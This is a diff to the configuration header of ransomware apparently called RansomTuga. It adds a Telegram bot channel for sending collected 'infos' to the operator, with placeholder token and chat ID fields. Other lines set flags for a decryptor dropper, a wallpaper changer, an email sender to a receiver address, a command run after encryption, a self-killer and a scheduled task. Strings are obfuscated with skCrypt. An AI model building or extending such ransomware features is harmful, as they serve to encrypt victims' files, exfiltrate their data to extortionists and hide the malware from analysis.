@@ -59,8 +59,11 @@
 #define DROP_DECRYPTOR		false	// enable or disable Decryptor dropper
 #define DROP_CUSTOM_FILE	false	// enable or disable custom file dropper (custom file location at the beggining of main.cpp)
 #define CHANGE_WALLPAPER	false	// enable or disable changer of wallpaper
+#define BACKUP_INFOFILE		true	// enable or disable backup maker in current folder for infoFile in debug mode
 #define SEND_EMAIL			true	// enable or disable email sender
 #define DEBUG_SEND_EMAIL	true	// enable or disable email sender in debug mode
+#define SEND_TGBOT			true	// enable or disable telegram bot sender
+#define DEBUG_SEND_TGBOT	true	// enable or disable telegram bot sender in debug mode
 #define SEND_CUSTOM_COMMAND false	// enable or disable custom command runner after encrytpion
 #define SELFKILL			false	// enable or disable self killer at the end of the program
 #define MAX_RETRIES			false	// enable or disable a maximum number of retries for decryptor
@@ -72,6 +75,10 @@
 #define RECEIVERMAIL	(string)skCrypt("receiver_email@gmail.com")	// receiver email
 #define EMAILSUBJECT	(string)skCrypt("RansomTuga infos")			// subject of the email
 #define EMAILBODY		(string)skCrypt("These are the infos")		// body of the email
+
+/* telegram settings */
+#define BOT_TOKEN	(string)skCrypt("0000000000:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX")	// telegram bot token
+#define CHAT_ID		(string)skCrypt("0000000000")										// telegram chat id (send to @myidbot the command /getid)
 
 /* scheduled task settings */
 #define TASKNAME	(string)skCrypt("RansomTuga")	// name of the scheduled task
